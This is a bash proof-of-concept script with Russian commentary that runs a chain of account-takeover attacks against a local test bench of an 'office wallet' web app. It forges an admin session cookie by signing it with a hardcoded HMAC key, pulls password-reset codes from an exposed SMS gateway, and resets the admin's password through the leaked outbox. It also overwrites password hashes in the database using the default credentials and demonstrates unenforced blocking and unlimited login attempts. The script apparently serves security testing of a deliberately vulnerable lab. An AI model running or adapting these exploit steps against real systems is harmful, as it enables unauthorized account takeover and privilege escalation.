#!/usr/bin/env bash
# stage_access.sh — «Доступы»: как получить чужой аккаунт и чужую роль.
#   sh poc/stage_access.sh
# Стенд должен быть поднят: docker compose up -d --build
# Пояснения к каждому шагу печатаются прямо в консоли, полные шаги — в poc/STEPS.md
. "$(dirname "$0")/lib.sh"

step "1. вход под рабочей учёткой"
say "Нужна любая живая учётка — дальше всё остальное вытягивается из неё."
say "Тестовая ivanov/workplace1, куки складываем в $JAR."
if login_as ivanov workplace1; then ok "сессия получена"; else
  fail "не удалось войти, стенд поднят?"; exit 1; fi

step "2. фейк админ-куки: роль в подписи, ключ в статике"
say "При входе сервер собирает куку ow.<uid>.<роль>.<HMAC-SHA256(SESSION_KEY, uid:роль)>."
say "Роль входит в подписываемую строку, но после проверки подписи с базой не сверяется"
say "(auth.go:40-43). Сам SESSION_KEY — константа, её отдаёт статика приложения,"
say "поэтому подпись считаем сами и подставляем себе роль admin. Пароль не нужен."
SIG=$(printf '6:admin' | openssl dgst -sha256 -hmac 'office-wallet-session-key' -hex | sed 's/.*= //')
COOKIE="ow_session=ow.6.admin.$SIG"
info "HMAC-SHA256(office-wallet-session-key, '6:admin') = ${SIG:0:20}..."
OUT=$(req "GET /admin/secrets  Cookie: ow_session=ow.6.admin.<hmac>" \
  -H "Cookie: $COOKIE" "$BASE/admin/secrets")
if echo "$OUT" | grep -q 'Админ Кошелька'; then ok "админка открыта без пароля"; else
  fail "админка не открылась"; fi
say "Та же кука открывает SMS-шлюз — там коды сброса паролей всех пользователей"
say "(админская страница, handlers_auth.go:158-179)."
req "GET /gateway/sms  (коды сброса паролей всех пользователей)" \
  -H "Cookie: $COOKIE" "$BASE/gateway/sms" \
  | grep -o 'код подтверждения сброса [0-9]*' | head -3 | sed 's/^/    /'

step "3. полный захват пароля жертвы через сброс"
say "Сброс чужого пароля собирается из трёх кусков, и все три уже у нас:"
say " 1) ссылка уходит на почту жертвы, но /mail отдаёт весь outbox любому вошедшему"
say "    (handlers_auth.go:181-200) — забираем её оттуда;"
say " 2) код подтверждения лежит в SMS-шлюзе, открытом кукой из шага 2;"
say " 3) срок действия кода не проверяется и лимита попыток нет (handlers_auth.go:146)."
OLD=$(db "SELECT password_hash FROM users WHERE login='adminw'")
req "POST /password/forgot  login=adminw (письмо и SMS уходят в общие ящики)" \
  -X POST -d 'login=adminw' "$BASE/password/forgot" > /dev/null
LINK=$(req "GET /mail  (весь outbox виден иванову)" -b "$JAR" "$BASE/mail" \
  | grep -o '/password/reset?rid=[0-9]*' | head -1)
RID=${LINK##*=}
CODE=$(req "GET /gateway/sms  (код по номеру заявки #$RID)" -H "Cookie: $COOKIE" "$BASE/gateway/sms" \
  | grep -o "код подтверждения сброса [0-9]* (заявка #$RID)" | grep -o '[0-9]\{6\}' | head -1)
info "ссылка: $LINK   код: $CODE"
req "POST /password/reset  rid=$RID&sms_code=$CODE&password=Hack1234" \
  -X POST --data-urlencode "rid=$RID" --data-urlencode "sms_code=$CODE" \
  --data-urlencode 'password=Hack1234' "$BASE/password/reset" > /dev/null
if login_as adminw Hack1234 /tmp/ow_victim.jar; then
  ok "пароль админа заменён, зашли: adminw / Hack1234"
else
  fail "вход под новым паролем не прошёл"
fi
db "UPDATE users SET password_hash='$OLD' WHERE login='adminw'" > /dev/null
info "пароль adminw восстановлен как был"

step "4. смена пароля напрямую в базе"
say "Второй способ, вообще без приложений и SMS: пароль БД wallet/wallet лежит в"
say "docker-compose.yml, порт открыт в сети compose (sslmode=disable). Обратного"
say "чтения bcrypt нет, но хеш заменяется на любой. Расширения pgcrypto в базе нет,"
say "поэтому готовый хеш не генерируем, а копируем: ставим жертве пароль, который"
say "мы и так знаем от ivanov."
info "→ UPDATE users SET password_hash=<хеш ivanov> WHERE login='adminw'"
info "← psql: $(db "UPDATE users SET password_hash=(SELECT password_hash FROM users WHERE login='ivanov') WHERE login='adminw'")"
if login_as adminw workplace1 /tmp/ow_victim2.jar; then
  ok "зашли: adminw / workplace1 — пароль иванова стал паролем админа"
else
  fail "вход под скопированным паролем не прошёл"
fi
db "UPDATE users SET password_hash='$OLD' WHERE login='adminw'" > /dev/null
info "пароль adminw восстановлен как был"

step "5. блокировка пользователя не работает"
say "Бухгалтер может заблокировать сотрудника — флаг blocked есть в базе и в сессии"
say "читается, но нигде не проверяется: ни при входе, ни дальше по работе"
say "(auth.go:17-44, в handlers_auth.go проверки вообще нет). То есть блокировка —"
say "это косметика: человек продолжает работать, пока сам не выйдет."
db "UPDATE users SET blocked=TRUE WHERE login='ivanov'" > /dev/null
info "← ivanov заблокирован в базе: blocked=$(db "SELECT blocked FROM users WHERE login='ivanov'")"
if login_as ivanov workplace1 /tmp/ow_blocked.jar; then
  ok "заблокированный всё равно входит"
else
  fail "вход под заблокированным не прошёл — блокировка работает?"
fi
CODE=$(curl -sS -o /dev/null -w '%{http_code}' -b "$JAR" "$BASE/")
info "← старая сессия тоже жива: HTTP $CODE"
db "UPDATE users SET blocked=FALSE WHERE login='ivanov'" > /dev/null
info "ivanov разблокирован обратно"

step "6. перебор пароля без ограничений"
say "Ни капчи, ни счётчика попыток, ни задержки: шесть неверных паролей подряд —"
say "шесть одинаковых ответов, ни одной блокировки, аккаунт жив."
for i in 1 2 3 4 5 6; do
  printf '    → попытка %d: login=ivanov password=nope   ' "$i"
  curl -sS -o /dev/null -w '← HTTP %{http_code}\n' -X POST \
    -d 'login=ivanov&password=nope&return=/' "$BASE/login"
done
if login_as ivanov workplace1 /tmp/ow_stage.jar; then
  ok "после шести ошибок вход по-прежнему работает, блокировки нет"
else
  fail "что-то заблокировалось — сбрось стенд"
fi
